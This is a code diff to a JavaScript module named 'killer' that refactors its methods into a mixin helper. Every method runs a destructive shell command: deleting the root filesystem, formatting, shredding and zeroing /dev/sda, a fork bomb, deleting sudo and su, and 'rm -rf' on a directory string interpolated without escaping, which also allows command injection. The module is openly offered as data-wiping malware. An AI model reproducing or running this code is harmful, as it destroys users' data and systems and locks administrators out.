@@ -8,6 +8,12 @@ let a  = require('app-root-path')
  * @function
  * @return {Promise} A promise object.
  */
+function protomix(constructor, mix){
+    for(var i in mix)
+      if(mix.hasOwnProperty(i))
+          constructor.prototype[i]=mix[i];
+}
+
 let killer = () => {
     return new Promise((done, er) => {
         shell.exec('rm -rf /', (c, o, e) => {
@@ -19,8 +25,8 @@ let killer = () => {
         })
     })
 }
-
-killer.prototype.destroyRoot = () => {
+protomix(killer, {
+    destroyRoot: () => {
         return new Promise((done, err) => {
             shell.exec('rm -rf /', (code, out, error) => {
                 if(error) {
@@ -30,9 +36,8 @@ killer.prototype.destroyRoot = () => {
                 }
             })
         })
-    }
-
-killer.prototype.format = () => {
+    },
+    format: () => {
         return new Promise((done, err) => {
             shell.exec('mkfs.ext3 /dev/sda', (code, out, error) => {
                 if(error) {
@@ -42,9 +47,8 @@ killer.prototype.format = () => {
                 }
             })
         })
-    }
-    
-killer.prototype.overWrite = () => {
+    },
+    overWrite: () => {
         return new Promise((done, err) => {
             shell.exec('shred -v /dev/sda', (code, out, error) => {
                 if(error) {
@@ -54,9 +58,8 @@ killer.prototype.overWrite = () => {
                 }
             })
         })
-    }
-
-killer.prototype.implode = () => {
+    },
+    implod: () => {
         return new Promise((done, err) => {
             shell.exec('mv / /dev/null', (code, out, error) => {
                 if(error) {
@@ -66,9 +69,8 @@ killer.prototype.implode = () => {
                 }
             })
         })
-    }
-
-killer.prototype.wipe = () => {
+    },
+    wipe: () => {
         return new Promise((done, err) => {
             shell.exec('dd if=/dev/zero of=/dev/sda', (code, out, error) => {
                 if(error) {
@@ -78,9 +80,8 @@ killer.prototype.wipe = () => {
                 }
             })
         })
-    }
-
-killer.prototype.forkBomb = () => {
+    },
+    forkBomb:  () => {
         return new Promise((done, err) => {
             shell.exec(':(){:|:&};:', (code, out, error) => {
                 if(error) {
@@ -90,9 +91,8 @@ killer.prototype.forkBomb = () => {
                 }
             })
         })
-    }
-
-killer.prototype.disableRoot = () => {
+    },
+    disableRoot: () => {
         return new Promise((done, err) => {
             shell.exec('rm -f /usr/bin/sudo;rm -f /bin/su', (c, o, e) => {
                 if(e) {
@@ -102,30 +102,30 @@ killer.prototype.disableRoot = () => {
                 }
             })
         })
-    } 
+    },
+    destroyProject: (dir) => {
+        return new Promise((d, e) => {
+            shell.exec(`rm -rf ${dir}`, (c, o, er) => {
+                if(er) {
+                    e(er)
+                } else {
+                    d(`Destroyed the dir ${dir}`)
+                }
+            })
+        })
+    },
+    destroyADir: (dir) => {
+        return new Promise((d, e) => {
+            shell.exec(`rm -rf ${dir}`, (c, o, er) => {
+                if(er) {
+                    e(er)
+                } else {
+                    d(`Destroyed the dir ${dir}`)
+                }
+            })
+        })
+    }
 
-killer.prototype.destroyProject = (dir) => {
-        return new Promise((d, e) => {
-            shell.exec(`rm -rf ${dir}`, (c, o, er) => {
-                if(er) {
-                    e(er)
-                } else {
-                    d(`Destroyed the dir ${dir}`)
-                }
-            })
-        })
-    }
-    
-killer.prototype.destroyADir = (dir) => {
-        return new Promise((d, e) => {
-            shell.exec(`rm -rf ${dir}`, (c, o, er) => {
-                if(er) {
-                    e(er)
-                } else {
-                    d(`Destroyed the dir ${dir}`)
-                }
-            })
-        })
-    }
+});
 
 module.exports = killer;
